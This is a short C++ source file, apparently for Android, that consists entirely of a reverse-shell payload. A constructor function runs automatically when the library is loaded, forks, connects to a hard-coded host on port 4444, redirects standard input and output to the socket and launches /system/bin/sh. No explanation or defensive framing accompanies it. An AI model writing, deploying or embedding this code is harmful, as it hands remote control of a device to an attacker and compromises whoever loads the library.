#include <cstdio>
#include <cstdlib>
#include <unistd.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>

// remote host to "send" shell
#define REMOTE_HOST "172.16.20.94"
#define REMOTE_PORT 4444

// use "__attribute__" to call "reverse_shell" when load library
void __attribute__ ((constructor)) reverse_shell() {
    // create child process with fork
    if (fork() == 0) {
        int rsSocket;

        struct sockaddr_in socketAddr{};

        // configure socket address
        socketAddr.sin_family = AF_INET;
        socketAddr.sin_addr.s_addr = inet_addr(REMOTE_HOST);
        socketAddr.sin_port = htons(REMOTE_PORT);

        // create socket connection
        rsSocket = socket(AF_INET, SOCK_STREAM, 0);
        connect(rsSocket, (struct sockaddr *) &socketAddr, sizeof(socketAddr));

        // redirect std to socket
        dup2(rsSocket, 0); // stdin
        dup2(rsSocket, 1); // stdout
        dup2(rsSocket, 2); // stderr

        // get shell
        execve("/system/bin/sh", nullptr, nullptr);
    }
}